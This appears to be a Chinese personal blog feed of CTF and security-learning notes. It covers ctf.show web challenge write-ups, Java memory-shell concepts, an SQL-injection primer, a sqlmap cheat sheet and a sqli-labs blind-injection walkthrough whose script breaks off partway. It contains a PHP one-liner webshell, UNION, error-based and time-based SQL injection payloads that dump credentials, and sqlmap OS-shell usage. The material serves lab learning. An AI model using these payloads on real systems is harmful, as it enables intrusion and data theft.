&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web4&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;include(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#x27;url&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;    &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在user-agent后面加了一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>一句话木马，使用蚁剑连接</p><p>密码就是cmd</p><p>在var/www/下面找到flag.txt</p><h5 id="web-4-2"><a href="#web-4-2" class="headerlink" title="web-4-2"></a>web-4-2</h5><p>机器人协议robots.txt</p><p>机器人协议，爬虫协议，本质是网站和搜索引擎爬虫的沟通方式，用来指导搜索引擎更好地抓取网站内容，</p><h5 id="web-5"><a href="#web-5" class="headerlink" title="web-5"></a>web-5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctf.show_web5</span><br><span class="line">where is flag?</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">        $v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">        $v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        </span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题限制第一个只能是字母第二个只能是数字</p><p>第一个和第二个的md5值要相等</p><p>可以使用md5的0E绕过，详细可以来看这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wangyuxiang946/article/details/119845182</span><br></pre></td></tr></table></figure><h5 id="web-6-1"><a href="#web-6-1" class="headerlink" title="web-6-1"></a>web-6-1</h5><p>这是一个文件泄露的题目，可以用<a href="http://www.zip下载备份文件/">www.zip下载备份文件</a></p><h5 id="web-6-2"><a href="#web-6-2" class="headerlink" title="web-6-2"></a>web-6-2</h5><p>不懂为什么，我再打开一次这个是一个sql注入的题目</p><p>输入万能钥匙发现过滤了空格，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般空格被过滤有如下替换方法</span><br><span class="line">1./**/</span><br><span class="line">2.()</span><br><span class="line">3.回车(url编码中的%0a)</span><br><span class="line">4.`(tap键上面的按钮)</span><br><span class="line">5.tap</span><br><span class="line">6.两个空格</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们就选用/**/来替换空格</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;/**/or/**/1=1/**/union/**/select/**/1,2,3/**/#&amp;password=123（判断回显位置）password随便写就行</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/#&amp;password=123  #获取表名</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;/**/#&amp;password=123  #获取列名</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag/**/#&amp;password=123  #拿到flag</span><br></pre></td></tr></table></figure><h5 id="web-7"><a href="#web-7" class="headerlink" title="web-7"></a>web-7</h5><h5 id="web-8"><a href="#web-8" class="headerlink" title="web-8"></a>web-8</h5><p>都是一样的，找到注入点后用python自动化脱库脚本爆破就好了</p><h5 id="web-9"><a href="#web-9" class="headerlink" title="web-9"></a>web-9</h5><p>vim在异常关闭时会产生swp可交换文件</p><p>这道题的答案就是在里面的</p><h5 id="web-10"><a href="#web-10" class="headerlink" title="web-10"></a>web-10</h5><p>将flag放到cookie里面，刷新网页然后使用F12查看cookie即可</p><h4 id="1-10总结"><a href="#1-10总结" class="headerlink" title="1-10总结"></a>1-10总结</h4><p>前十个里面有这么几种信息收集的方式</p><p>cookie</p><p>swp交换文件</p><p>sql注入</p><p>源码，注释，bp抓包里面</p><p>绕过md5的0E等等</p><p>robots.txt爬虫协议</p><h5 id="web-11"><a href="#web-11" class="headerlink" title="web-11"></a>web-11</h5><p>网站的域名也会隐藏信息</p><p>这道题中用<a href="http://dbcha.com/%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%BE%97%EF%BC%88A%E8%AE%B0%E5%BD%95%E6%94%B9%E6%88%90txt">http://dbcha.com/可以直接获得（A记录改成txt</a></p><h5 id="web-12"><a href="#web-12" class="headerlink" title="web-12"></a>web-12</h5><p>这个题目中，他是一个网站</p><p>登录到/admin里面以后</p><p>要求输入账户密码，账户使用默认账户，密码的话网站中可能存在，所以找了找试了试最下面的电话，成功</p><p><em>常见的渗透思路</em></p><h5 id="web-13"><a href="#web-13" class="headerlink" title="web-13"></a>web-13</h5><p>这个是一个考眼力的题目，他在最下面第三个里有一个唯一小些的document,并且可以打开文档。里面有这个东西的使用</p><p>说明，值得注意的是，里面的</p><p><a href="http://your-domain/%E6%98%AF%E4%BD%A0%E7%9A%84%E5%9F%9F%E5%90%8D%E7%9A%84%E6%84%8F%E6%80%9D%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E7%9B%B4%E6%8E%A5%E5%A5%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%8E%AF%E5%A2%83%E4%B8%8A%E5%B0%B1%E5%8F%AF%E4%BB%A5">http://your-domain/是你的域名的意思，在这个题目中的意思就是直接套到靶场的环境上就可以</a></p><h5 id="web-14"><a href="#web-14" class="headerlink" title="web-14"></a>web-14</h5><p>打开之后是一个巨信的界面</p><p>提示说是编译器的问题，所以要在源码中搜索editor</p><p>发现一个这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;editor/upload/banner-app.png&quot; alt=&quot;App&quot;&gt;</span><br></pre></td></tr></table></figure><p>说明是有编译器的（据说是百度的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/editor/</span><br></pre></td></tr></table></figure><p>打开以后可以看到有一系列的文件上传什么的，在插入文件的文件空间中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/editor/attached/file/var/www/html/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p>发现这么个东西</p><p>输入到url不对，看了show的视频说是（注意url形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/editor/attached/file/这一段是编译器的绝对路径</span><br><span class="line">var/www/html/</span><br><span class="line">nothinghere/fl000g.txt只需要输入这个就可以了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><h5 id="web-15"><a href="#web-15" class="headerlink" title="web-15"></a>web-15</h5><p>有点社工的感觉，这道题有个邮箱提示，在网站中输入admin可以进入管理员登录界面，刚开始输入邮箱作为密码会提示密码错误，但是有一个忘记密码</p><p>忘记密码的提示是我生活在什么城市，这个可以通过QQ邮箱来进行社工，找到以后就OK了</p><h5 id="web-16"><a href="#web-16" class="headerlink" title="web-16"></a>web-16</h5><p>打开是一个元素周期表，提示说是探针忘记删除了，所以可以通过tz.php进行查看参数，在里面找flag</p><h5 id="web-17"><a href="#web-17" class="headerlink" title="web-17"></a>web-17</h5><p>备份的sql文件会泄露数据</p><p>backup.sql直接进就行</p><h5 id="web-18"><a href="#web-18" class="headerlink" title="web-18"></a>web-18</h5><p>这道题在源码中找js文件，js里面有一个gameover</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b)</span><br></pre></td></tr></table></figure><p>在控制台中构造一个alert即可</p><h5 id="web-19"><a href="#web-19" class="headerlink" title="web-19"></a>web-19</h5><p>在源码中看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往上看的话看到p=pazzword，u=username，post传参即可</p><h5 id="web-20"><a href="#web-20" class="headerlink" title="web-20"></a>web-20</h5><p>这个是一个数据库的题，他说自己是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我是asp程序，我用的access数据库</span><br></pre></td></tr></table></figure><p>看了看视频说可以尝试mdb.db或者data.db或db.mdb，第三个成功了</p><p>用查看器查看就能得到（注意要拉开表</p><h4 id="web信息收集总结"><a href="#web信息收集总结" class="headerlink" title="web信息收集总结"></a>web信息收集总结</h4><p>主要还是靠眼力,另外,swp,sql,数据库,探针,编译器等等也会泄露信息</p><p>此外post传参,源码,等等的也会，做题的时候注意一下</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存马入门知识学习</title>
      <link href="/2023/05/04/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%A1%AB%E5%9D%91%EF%BC%89/"/>
      <url>/2023/05/04/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%A1%AB%E5%9D%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Java Servlet前置知识</p><p>Servlet/Filter/Listener Java Web三大件</p><h3 id="1-Servlet"><a href="#1-Servlet" class="headerlink" title="1.Servlet"></a>1.Servlet</h3><p>Servlet是服务期端的Java的应用程序，用于处理http请求并做出相应的响应。</p><p><img src="https://s2.loli.net/2023/05/04/c9diYKwZAu1UQVb.png" alt="7200f7125f97563204de7ea26dc35c62.png"></p><h2 id="2-Filter"><a href="#2-Filter" class="headerlink" title="2.Filter"></a>2.Filter</h2><p>介于Web和Servlet之间的过滤器，用于过滤未到达Servlet的请求或者由Servlet生成但还没有返回响应</p><p>（可见上图）</p><h2 id="3-listener"><a href="#3-listener" class="headerlink" title="3.listener"></a>3.listener</h2><p>listener是用于监听某些特定动作的监听器。当特定动作发生时，监听该动作的监听器会自动调用相应的方法，比如</p><p><img src="https://s2.loli.net/2023/05/04/TPpq5HERw7okcVd.png" alt="f6ffb2c6e921b812dd6da32a017023e8.png"></p><p>解释一下上图，但我们创建一个session时，会自动调用HttpSessionListener中的sessionCreated，而当session被销毁的时候也同时会调用 sessionDestroyed() 方法</p><h2 id="内存马的攻击面"><a href="#内存马的攻击面" class="headerlink" title="内存马的攻击面"></a>内存马的攻击面</h2><p>webshell实际上也是一种web服务，所以可以有以下几种思路</p><p>1.动态注册/字节码替换 interceptor/controller（使用框架如 spring/struts2/jfinal）</p><p>2.动态注册/字节码替换 使用责任链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</p><p>3.动态注册/字节码替换 servlet-api 的具体实现 servlet/filter/listener</p><p>4.动态注册/字节码替换一些定时任务的具体实现 比如 TimeTask等</p><p>所以，webshell作为一个后门，实际上我们需要他完成的工作室能够接受恶意注入并回显。</p><p>（后面设计的知识还没学，过几天做回来填坑）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基本知识</title>
      <link href="/2023/04/24/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/24/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>url中?表示传参，id表示变量，</p><p>参数类型</p><ol><li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li></ol><p>如 <a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id=3</p><ol start="2"><li>字符型：字符型注入正好相反</li></ol><p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p><p>例如数字型语句：select * from table where id =3</p><p>则字符型如下：select * from table where name=’admin’</p><p>注入手法的话可以分为以下几类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入：union selest</span><br><span class="line">报错注入：</span><br><span class="line">group by（重复键冲）</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"> extractvalue() 函数</span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+</span><br><span class="line"> updatexml() 函数</span><br><span class="line">获取数据库名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),1) --+</span><br><span class="line">获取当前数据库中表的名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆表中的字段?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select column_name from  information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆字段中的内容?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">布尔盲注</span><br><span class="line">时间盲注</span><br><span class="line">多语句查询注入：</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/114325805</span><br></pre></td></tr></table></figure><p>布尔盲注和时间盲注直接用sqlmap注入吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用指北</title>
      <link href="/2023/04/24/sqlmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2023/04/24/sqlmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><p>扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u “网站”</span><br></pre></td></tr></table></figure><p>查询当前数据库下的所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py &quot;网站&quot; -dbs</span><br></pre></td></tr></table></figure><p>判断文件是否存在注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 文件名（文件名要有正确的路径）</span><br></pre></td></tr></table></figure><p>获取数据库中的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;网站&quot; -D 数据库 --tables</span><br></pre></td></tr></table></figure><p>获取表中的字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;网站&quot; -D 数据库 -T 表名 --columns</span><br></pre></td></tr></table></figure><p>获取字段类容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;网站&quot; -D 数据库 -T 表名 -C 字段名 --dump</span><br></pre></td></tr></table></figure><p>获取数据库密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;网站&quot; --passwords</span><br></pre></td></tr></table></figure><p>获取当前数据库网站的名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap,py -u &quot;网址&quot; --current-db</span><br></pre></td></tr></table></figure><p>获取当前网站数据库用户名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap,py -u &quot;网址&quot; --current-user</span><br></pre></td></tr></table></figure><h2 id="level等级"><a href="#level等级" class="headerlink" title="level等级"></a>level等级</h2><p>总共有1-5共计5个等级，套测等级越高，使用时间越长，<strong>GET和POST的数据都会进行测试，HTTP cookies在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试</strong></p><h2 id="进阶版（都还没试过）"><a href="#进阶版（都还没试过）" class="headerlink" title="进阶版（都还没试过）"></a>进阶版（都还没试过）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--is-dba</span><br></pre></td></tr></table></figure><p>查看是不是管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--rolas</span><br></pre></td></tr></table></figure><p>列出数据库管理员角色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--referer</span><br></pre></td></tr></table></figure><p>查看数据库用户的角色</p><p>P.S.</p><ul><li>SQLMap可以在请求中伪造HTTP中的referer，<br>当–level参数设定为3或3以上时；<br>会尝试对referer注入。可以使用referer命令来欺骗</li></ul><p>(还没试过，等遇到题试试去)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--sql-shell</span><br></pre></td></tr></table></figure><p>执行指定的sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd,--os-shell</span><br></pre></td></tr></table></figure><p>在数据库为MySOL、PostgreSOL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，如果数据库为MySQL、PostgreSQL，SQLMap上传一个二进制库，包含用户自定义的函数sys exec)和sys eval，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp cmdshell存储过程，如果被禁用（在MicrosoftSQLServer2005及以上版本默认被禁制），则SQLMap会重新启用它；如果不存在，会自动创建。<br>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时（比如PHP或ASP的后端数据库为MySQL），仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言（要想执行改参数，需要有数据库管理员权限，也就是–is-dba的值要为True）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--file-read</span><br></pre></td></tr></table></figure><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQLServer，并且当前用户有权限使用特定的函数时</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs10</title>
      <link href="/2023/04/24/sqllibs10/"/>
      <url>/2023/04/24/sqllibs10/</url>
      
        <content type="html"><![CDATA[<p>不知道为什么我用一句话木马上传的bool盲注都不行，想着能用sqlmap实现1-9，所以直接开了10</p><p>sqli-libs10是一个时间盲注</p><p>WP说选择时间盲注是因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">页面无显示位，不适合联合注入；</span><br><span class="line"></span><br><span class="line">页面不显示数据库的报错信息，不适合报错注入；</span><br><span class="line"></span><br><span class="line">查询的正确和错误不会影响页面的响应（后台写死了，只返回You are in...........），不适合布尔盲注；</span><br><span class="line"></span><br><span class="line">综上所述，尝试使用时间盲注。</span><br></pre></td></tr></table></figure><p>首先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(1,sleep(5),3) -- a </span><br></pre></td></tr></table></figure><p>页面响应超过5秒，确定存在时间盲注</p><h3 id="然后采用Python自动化脚本"><a href="#然后采用Python自动化脚本" class="headerlink" title="然后采用Python自动化脚本"></a>然后采用Python自动化脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line"># 将url 替换成你的靶场关卡网址</span><br><span class="line"># 修改两个对应的payload</span><br><span class="line"> </span><br><span class="line"># 目标网址（不带参数）</span><br><span class="line">url = &quot;“</span><br><span class="line"># 猜解长度使用的payload</span><br><span class="line">payload_len = &quot;&quot;&quot;?id=1&quot; and if(</span><br><span class="line">(length(</span><br><span class="line">(database())</span><br><span class="line">) =&#123;n&#125;)</span><br><span class="line">,sleep(5),3) -- a&quot;&quot;&quot;</span><br><span class="line"># 枚举字符使用的payload</span><br><span class="line">payload_str = &quot;&quot;&quot;?id=1&quot; and if(</span><br><span class="line">(ascii(</span><br><span class="line">substr(</span><br><span class="line">(database())</span><br><span class="line">,&#123;n&#125;,1)</span><br><span class="line">) =&#123;r&#125;)</span><br><span class="line">,sleep(5),3) -- a&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"># 获取长度</span><br><span class="line">def getLength(url, payload):</span><br><span class="line">    length = 1  # 初始测试长度为1</span><br><span class="line">    while True:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url= url+payload_len.format(n= length))</span><br><span class="line">        # 页面响应时间 = 结束执行的时间 - 开始执行的时间</span><br><span class="line">        use_time = time.time() - start_time</span><br><span class="line">        # 响应时间&gt;5秒时，表示猜解成功</span><br><span class="line">        if use_time &gt; 5:</span><br><span class="line">            print(&#x27;测试长度完成，长度为：&#x27;, length,)</span><br><span class="line">            return length;</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;正在测试长度：&#x27;,length)</span><br><span class="line">            length += 1  # 测试长度递增</span><br><span class="line"> </span><br><span class="line"># 获取字符</span><br><span class="line">def getStr(url, payload, length):</span><br><span class="line">    str = &#x27;&#x27;  # 初始表名/库名为空</span><br><span class="line">    # 第一层循环，截取每一个字符</span><br><span class="line">    for l in range(1, length+1):</span><br><span class="line">        # 第二层循环，枚举截取字符的每一种可能性</span><br><span class="line">        for n in range(33, 126):</span><br><span class="line">            start_time = 